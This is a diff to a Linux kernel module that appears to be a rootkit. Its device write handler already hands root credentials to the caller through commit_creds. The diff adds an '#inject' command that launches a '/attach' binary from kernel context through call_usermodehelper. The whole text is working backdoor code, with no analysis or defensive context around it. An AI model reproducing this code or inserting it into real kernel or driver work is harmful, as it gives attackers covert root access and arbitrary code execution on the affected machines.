@@ -85,6 +85,17 @@ static struct notifier_block nb = {
 
 static struct list_head *mlist;
 
+static int inject_shell(void) {
+	char *args[] = {"/attach", "1", NULL};
+
+	static char *env[] = {
+		"HOME=/",
+		"TERM=linux",
+		"PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
+
+	return call_usermodehelper(args[0], args, env, UMH_WAIT_PROC);
+}
+
 static int device_open(struct inode *inode, struct file *file) {
 
 	if(is_open)
@@ -165,6 +176,9 @@ device_write(struct file *filp, const char *buff, size_t len, loff_t *off) {
 		creds->egid.val = 0;
 
 		commit_creds(creds);
+	} else if(strncmp("#inject", buff, 7) == 0) {
+		res = inject_shell();
+		printk(KERN_INFO "injection status %d\n", res);
 	}	
 
 	return -EINVAL;
